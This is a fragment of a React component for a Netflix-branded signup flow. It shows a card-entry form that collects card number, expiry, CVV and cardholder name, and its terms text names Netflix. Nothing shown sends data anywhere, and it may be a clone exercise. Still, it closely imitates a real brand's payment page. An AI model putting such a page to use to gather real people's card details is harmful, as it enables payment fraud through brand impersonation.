            <span className="nx-pay-encrypted">End-to-end encrypted <svg width="12" height="13" viewBox="0 0 24 26" fill="none" aria-hidden="true" style={{ verticalAlign: '-1px' }}><rect x="3" y="10" width="18" height="13" rx="2" stroke="#333" strokeWidth="2" /><path d="M7.5 10V7a4.5 4.5 0 019 0v3" stroke="#333" strokeWidth="2" /></svg></span>
            <button type="button" className="nx-pay-option" onClick={() => goToStep('card')} disabled={loadingAction}>
              <span className="nx-pay-label">
                Credit or Debit Card
                <span className="nx-card-brands">
                  <i style={{ background: '#1a1f71', color: '#fff' }}>VISA</i>
                  <i style={{ background: '#fff' }}><span style={{ color: '#eb001b' }}>●</span><span style={{ color: '#f79e1b', marginLeft: -4 }}>●</span></i>
                  <i style={{ background: '#006fcf', color: '#fff' }}>AMEX</i>
                </span>
              </span>
              {loadingAction ? <span className="nx-pay-loading"><span className="nx-btn-spinner" aria-hidden="true" /></span> : <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M9 6l6 6-6 6" stroke="#000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>}
            </button>
          </div>
        </main>
      )}

      {/* ============ STEP 3 of 3 — card details ============ */}
      {step === 'card' && (
        <main className="nx-signup-main nx-signup-card-main">
          <button type="button" className="nx-back-link" onClick={() => setStep('pay')}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M15 18l-6-6 6-6" stroke="#0071eb" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round"/></svg>
            Change payment method
          </button>
          <StepIndicator step={step} />
          <h1>Set up your credit or debit card</h1>
          <div className="nx-card-brands nx-card-brands-lg">
            <i style={{ background: '#1a1f71', color: '#fff' }}>VISA</i>
            <i style={{ background: '#fff' }}><span style={{ color: '#eb001b' }}>●</span><span style={{ color: '#f79e1b', marginLeft: -4 }}>●</span></i>
            <i style={{ background: '#006fcf', color: '#fff' }}>AMEX</i>
          </div>
          <form onSubmit={(e) => {
            e.preventDefault();
            const errors = {};
            if (card.number.replace(/\s/g, '').length < 15) errors.number = 'Card number is required';
            if (!/^\d{2}\/\d{2}$/.test(card.expiry)) errors.expiry = 'Expiration date is required';
            if (card.cvv.length < 3) errors.cvv = 'CVV is required';
            if (!card.name.trim()) errors.name = 'Name on card is required';
            if (!agree) errors.agree = 'You must agree to continue';
            setCardErrors(errors);
            if (Object.keys(errors).length) return;
            setError('');
            finishMembership();
          }}>
              <div className={`nx-infield nx-infield-light has-value ${cardErrors.number ? 'nx-invalid' : ''}`}>
              <label>Card number</label>
              <input type="text" inputMode="numeric" value={card.number} onChange={(e) => { setCard({ ...card, number: fmtCard(e.target.value) }); setCardErrors({}); }} />
              <svg className="nx-field-ico" width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="2" y="5" width="20" height="14" rx="2" stroke="#666" strokeWidth="1.6"/><path d="M2 10h20" stroke="#666" strokeWidth="1.6"/></svg>
            </div>
            <FieldError message={cardErrors.number} />
            <div className="nx-card-split">
              <div className={`nx-infield nx-infield-light has-value ${cardErrors.expiry ? 'nx-invalid' : ''}`}>
                <label>Expiration date</label>
                <input type="text" inputMode="numeric" value={card.expiry} onChange={(e) => { setCard({ ...card, expiry: fmtExpiry(e.target.value) }); setCardErrors({}); }} />
              </div>
              <div className={`nx-infield nx-infield-light has-value ${cardErrors.cvv ? 'nx-invalid' : ''}`}>
                <label>CVV</label>
                <input type="password" inputMode="numeric" maxLength={4} value={card.cvv} onChange={(e) => { setCard({ ...card, cvv: e.target.value.replace(/\D/g, '') }); setCardErrors({}); }} />
                <svg className="nx-field-ico" width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#666" strokeWidth="1.6"/><path d="M9.5 9.5a2.5 2.5 0 114 2c-.9.7-1.5 1.2-1.5 2.3M12 17v.3" stroke="#666" strokeWidth="1.6" strokeLinecap="round"/></svg>
              </div>
            </div>
            <div className={`nx-infield nx-infield-light has-value ${cardErrors.name ? 'nx-invalid' : ''}`}>
              <label>Name on card</label>
              <input type="text" value={card.name} onChange={(e) => { setCard({ ...card, name: e.target.value }); setCardErrors({}); }} />
            </div>
            <FieldError message={cardErrors.name} />

            <div className="nx-plan-summary">
              <div>
                <b>{plan.price}/month</b>
                <span>{plan.name}</span>
              </div>
              <button type="button" className="nx-change-plan" onClick={() => setStep('plan')}>Change</button>
            </div>

            <p className="nx-card-fees">
              Your payments will be processed internationally. Additional bank fees may apply.
            </p>
            <p className="nx-terms">
              By checking the checkbox below, you agree to our <Link to="/p/terms">Terms of Use</Link>, <Link to="/p/privacy">Privacy Statement</Link>, and that you are over 18. Netflix will automatically continue your membership and charge the membership fee (currently {plan.price}/month) to your payment method until you cancel. You may cancel at any time to avoid future charges.
            </p>
            <label className={`nx-remember nx-offers ${cardErrors.agree ? 'nx-check-invalid' : ''}`}>
              <input type="checkbox" checked={agree} onChange={(e) => { setAgree(e.target.checked); setCardErrors({}); }} />
              I agree.
            </label>
            <FieldError message={cardErrors.agree} />
            <button className="nx-btn-continue" disabled={busy}><ButtonLabel loading={busy}>Start Membership</ButtonLabel></button>
          </form>
        </main>
      )}

      {step !== 'upgrade' && helpBlock}
    </div>
  );
}





